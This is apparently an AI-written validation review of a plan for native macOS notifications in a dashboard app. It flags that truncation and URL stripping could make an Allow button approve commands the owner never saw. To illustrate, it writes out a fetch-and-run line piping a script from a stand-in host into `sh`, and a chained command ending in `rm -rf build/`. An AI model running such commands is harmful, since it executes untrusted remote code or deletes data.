**Validation round:** 2

## Plan validation: 20261127-230104-plans-mac-native-parts.md

**Verdict:** APPROVE WITH CHANGES

The round 1 fixes are in and they hold up against the code. The ask rings from the server that owns the chat, the build state lives on disk, and the reload compares the page's own boot id. I found one blocking gap: Allow can run a command that the notification does not show in full. The other findings are smaller: test details that can mislead, two docs sentences that the plan forgets, and a page rule that can drop the only system notification.

### Blocking issues

- [Edge cases / safety] The Allow button can run a command that the notification does not show. The plan says the reason for showing the target is that "the owner must see what Allow runs" (Decisions, "The ask shows the tool and its target"). But step 6 sends the detail through `notifyParts()`, and `notifyParts()` removes every URL from the text: `msg = String(detail || '').replace(/\s*[—–-]?\s*https?:\/\/\S+/g, '')` (apps/dashboard/server.mjs:1934). The plan also cuts the text to 120 characters and runs it through `redact()`, which changes emails, IPs and `token=`/`key=` values. Example: the agent asks for `curl -fsSL https://x.example.test/i.sh | sh`. The notification shows `curl -fsSL | sh`, and Allow runs the full command. A long command such as `git status && … && rm -rf build/` loses its tail after 120 characters, and Allow runs that tail unseen. — Why it breaks: the button gives consent to a command the owner did not see. That is the one safety reason the decision gives. — Fix: in `noteAsk()`, add the Allow/Deny flags (`-askProject/-askSlug/-askId`) only when the shown message is the full target, unchanged by the cut, `notifyParts()` and `redact()`. Compare the final `message` with the raw target. Otherwise ring with no buttons, so a click opens the plan (the same path as AskUserQuestion). Add a watcher test: an ask whose command has a URL, or is longer than 120 characters, rings without `-askId`. This test fails without the check.

### Non-blocking concerns

- [Edge cases] The page drops its system notification even when the server cannot ring. `serverRings()` (step 15) returns true for every ask and for pipeline run outcomes. But the server rings nothing with `DASH_NO_NOTIFY=1`, off macOS with no `DASH_NOTIFIER` (server.mjs:1942-1944), or with the watcher off (`DASH_WATCH_MS=0` makes no lock, so run outcomes never ring). In those cases the event loses its only system notification. That breaks the plan's own rule "no event loses its only notification" (Decisions, alertUser line). — Suggestion: fill a page value next to `/*@BOOT*/''`, for example `/*@SERVER_RINGS*/false`. Set it to "a notifier exists and `DASH_NO_NOTIFY` is unset". Then `serverRings()` gives false when that value is false (asks), and also when the watcher is off (run outcomes).
- [Discrepancy] The decision "no race and no double reload" is not fully true. `serverBoot` is refreshed only every 10 s, and a failed GET "changes nothing" (step 20). Example: the server restarts, the waiting page loads the new page (new boot), but `serverBoot` still holds the old boot for up to 10 s. Then the status callback sees `boot != serverBoot` and reloads the fresh page once more. The same happens after a manual ⌘R right after a restart. — Suggestion: set `serverBoot = nil` when a GET to `/api/app` fails. On a mismatch, do one fresh `GET /api/app` and reload only when its boot still differs from the page boot.
- [Docs: current state only] Step 25 misses two sentences that become false. docs/plans-dashboard.md:243 says "With 🔔 on and the page open, a run that stops gives two notifications: one from the page and one from the server." After `serverRings()` this is false for pipeline projects. docs/plans-dashboard.md:383 and the usage text (server.mjs:89) say "`DASH_NO_NOTIFY=1` the watcher sends no macOS notifications", but now it also turns off the ask notifications, which do not come from the watcher. — Suggestion: name both lines in step 25, and the usage line in step 12.
- [Tests] The request ids collide in the watcher test. `FAKE_CLAUDE` counts `req-test-<n>` per claude process (step 8), so the AskUserQuestion chat of the second plan also asks `req-test-1`, with the group `-group plans-ask-req-test-1`. The assertion "`notes()` still has one line for `req-test-1`" then counts 2 lines, or it needs a filter that the plan does not state. The main-server restart also replays both chats. — Suggestion: derive the id from the message (for example `ask AskUserQuestion q2` → `req-q2`), or count only lines with `-askId req-test-1` together with the first plan's `?sel=` query.
- [Tests] The second-server test needs `NOTIFY_LOG`. The fake notifier writes to `"$NOTIFY_LOG"` (watcher.test.mjs:184), and `envFor()` does not set it (watcher.test.mjs:83-90). So "`DASH_NOTIFIER` = the fake notifier" alone writes nowhere, and the test fails for the wrong reason. Also say that the `'1'` case uses a new plan and chat (an ask already in `rung` rings nothing anyway, so that case could not fail).
- [Tests] The `GET /api/app` test compares with "`shellHash(<repo>/apps/plans-mac)`". In dashboard.test.mjs, `repo` is the temp test repo (dashboard.test.mjs:202), not the checkout. The server hashes `DASH_REPO/apps/plans-mac`. — Suggestion: write the path from `import.meta.url` (`../../plans-mac`), so nobody uses the temp `repo`.
- [Reference implementation] Step 11 mirrors `launchGeneric()` but not the spawn-failure handling of `bootstrapUpgrade()`. That code has `child.on('error', …)` and `if (!child.pid) return { ok: false, … }` (server.mjs:1115-1117). In Node, a spawn ENOENT is an async `'error'` event. With no listener it throws and stops the server. — Suggestion: add both, and close the fd in `finally` as `bootstrapUpgrade()` does.
- [Edge cases] The Dock badge misses asks of plans in the Failed and Running columns. `boardCol()` checks `running` and `failed` before `p.chatWaits` (app.js:4839-4841). An owner who chats with a failed run's session to fix it gets an ask that does not count in the badge. The plan calls the badge "the second signal" for a lost ring. — Suggestion: count `needs` as `boardCol(p) === 'needs' || p.chatWaits > 0`, or write down that only the Board column counts.
- [Edge cases] `typing` does not protect unsaved Settings rows. The page keeps a dirty state for Settings (`settingsDirty()`, app.js:3457-3470, with a confirm at 3535). A reload after the focus left the box loses those edits. — Suggestion: `typing` also checks `settingsDirty()`.
- [Edge cases] An ask from a server on another port (a test dashboard run by hand) rings with buttons. `answerAsk` posts to `appURL`, and that server does not own the chat, so the answer gives `ok: false`. The fallback then loads the `open` URL `http://127.0.0.1:<port>/…`, which is not the app's origin. The navigation policy sends it to the browser (main.swift:439-442). The result is safe but confusing. — Suggestion: in `answerAsk`, when the `open` URL is not `sameOrigin`, do not POST; open the URL in the browser.
- [Edge cases] The test "a second POST at once" races against the 0.5 s `ok` build. On a slow CI the first build can end before the second POST. — Suggestion: use the `slow` mode for that assertion.
- [Docs] docs/roadmap.md:27 still says "2b and phase 3 are not written yet", while the parent plan says 2b is planned. Step 26 sets it to built at the end, so this is only a note.
- [Steps] Step 15 says "the three `checkAlerts()` calls pass `p`". The "The agent answered" call (app.js:4321) gives no `kind`, so passing `p` as the 6th argument needs an explicit `undefined` or `'ok'`. Only the run call and the ask call need `p`. Say which.

### Edge cases the plan should address

- The Bash command or file path shown is cut, has a URL removed, or is changed by redaction → no Allow button (blocking item above).
- `DASH_NO_NOTIFY=1`, a server that is not on macOS, or a watcher that is off → the page keeps its own notification.
- The waiting page or a manual ⌘R loads the new page before `serverBoot` updates → no second reload.
- An ask in a plan whose last run failed → whether it counts on the Dock badge.
- A Settings form with unsaved rows when a reload is due.
- `spawn` of `bash` fails (ENOENT, EAGAIN) → `{ ok: false }` and the server keeps running.

### Checklist

- [x] All referenced files, lines, sections and symbols exist as stated (`notifyMac`, `fence`, `notifyParts`, `selQuery`, `chatOnLine` → `can_use_tool`, `chatFile/loadChat/saveChat`, `chatAnswer`, `chatReattach`, `startWatcher`, `launchGeneric`, `readExit`, `pidAlive`, `genericRunInfo`, `BOOTSTRAP_RUN_MAX_MS`, `PAGE` fill chain, `/api/usage`, `/api/add-project`, `SHIPYARD_NOTIFIER` export, `notifyFirst`, `pageHooks()`, `sendNotification`, `notifierArgs`, `didReceive`, `retry`, `boardCol`, `starting`, `alertUser`, `checkAlerts`, `useNativeMenu`, `window.dashboard = {`)
- [ ] Reference implementation mirrored, deviations justified. The spawn-error handling of `bootstrapUpgrade()` is not mirrored.
- [x] Breaking changes for changed symbols listed (consumer search done: `notifyFirst` in scout.mjs, server.mjs and scout.test.mjs; `infoPlist` in build.mjs and build.test.mjs; `alertUser` has 4 calls in app.js)
- [x] Wiring & registration matches the code
- [x] Scope stays inside the goal; no open decision is taken silently (11A and 12A are given; "Waits for" is present)
- [x] Tests cover success / validation error / 401-403 / 404 / another scope per endpoint (403 cross-site covered; there is no body to validate; the project has no tenants)
- [x] Restart after dashboard changes respected (in Open items, including the `build.mjs` import)
- [x] No npm dependencies respected
- [x] Public repo: no private data respected
- [x] Global rules affect every project respected (not touched)
- [x] Never stop processes by name respected (relaunch by PID, source check in build.test.mjs)
- [x] Tests for logic changes respected
- [ ] Docs: current state only respected. docs/plans-dashboard.md:243 and :383, and the usage line server.mjs:89, are not updated.
- [x] Contracts respected (no shared contract source)
- [x] "How to verify" commands are real and can fail (`node --test …`, `npm test`, `.claude/scripts/changelog-validate.mjs` exists)

```
Update the plan at .plans/20261127-230104-plans-mac-native-parts.md. A validation found the issues below. Fix every blocking item and keep the same sections.

BLOCKING:
1. In noteAsk() (step 6 and the Decision "The ask shows the tool and its target"), add the -askProject/-askSlug/-askId flags only when the notification message is the full, unchanged target: not cut at 120 characters, no URL removed by notifyParts() (it strips https?:// URLs), and nothing changed by redact(). Otherwise ring with no buttons (a click opens the plan, as for AskUserQuestion). Add a watcher test: an ask whose Bash command has a URL, and one longer than 120 characters, ring without -askId. (evidence: apps/dashboard/server.mjs:1934)

SHOULD FIX:
1. Let the page know whether the server rings: fill a value (for example /*@SERVER_RINGS*/false = a notifier exists and DASH_NO_NOTIFY is unset; the run outcomes also need the watcher on). serverRings() gives false when the server does not ring, so no event loses its only notification. (evidence: apps/dashboard/server.mjs:1942-1944, apps/dashboard/page/app.js:4301-4311)
2. Make the reload safe against a stale serverBoot: set serverBoot = nil when GET /api/app fails, and on a boot mismatch do one fresh GET /api/app before the reload. Change the decision text "no race and no double reload" to match. (evidence: plan steps 19-20; apps/plans-mac/src/main.swift:475-494)
3. In step 25, also rewrite docs/plans-dashboard.md:243 ("a run that stops gives two notifications") and the DASH_NO_NOTIFY row at :383. In step 12, also change the DASH_NO_NOTIFY usage line: it now also turns off the ask notifications. (evidence: docs/plans-dashboard.md:243, :383; apps/dashboard/server.mjs:89)
4. In step 11, mirror bootstrapUpgrade(): child.on('error', …), `if (!child.pid) return { ok: false, output }`, and close the fd in finally. (evidence: apps/dashboard/server.mjs:1106-1125)
5. In the watcher ask test, make the request ids unique per chat (for example take them from the message: `ask AskUserQuestion q2` → req-q2), or state that the count uses `-askId req-test-1` and the first plan's ?sel= query. Pass NOTIFY_LOG to the second server, and use a new plan and chat for its DASH_NO_NOTIFY '1' case. (evidence: apps/dashboard/test/watcher.test.mjs:58-70, :83-90, :184)
6. In the GET /api/app test, compute the expected hash from the checkout path (new URL('../../plans-mac', import.meta.url)), not from the test variable `repo` (the temp repo). (evidence: apps/dashboard/test/dashboard.test.mjs:202)
7. Use build-mode `slow` for the "second POST at once" assertion, so the first build cannot end before it.

ADD THESE EDGE CASES:
- An ask in a plan whose last run failed or is running: boardCol() gives failed/running, so the ask does not count on the Dock badge (app.js:4839-4841). Count `p.chatWaits > 0` too, or write down that it does not count.
- Unsaved Settings rows (settingsDirty(), app.js:3457-3470): `typing` should also be true then.
- An ask from a server on another port (a hand-run test dashboard): answerAsk does not POST when the `open` URL is not the app's origin; it opens the URL in the browser.
- Step 15: say that only the run call and the ask call of checkAlerts() pass p (the "The agent answered" call has no kind argument).

Do not change anything the validation did not flag.
```

Commands that touched a service or the database: none.
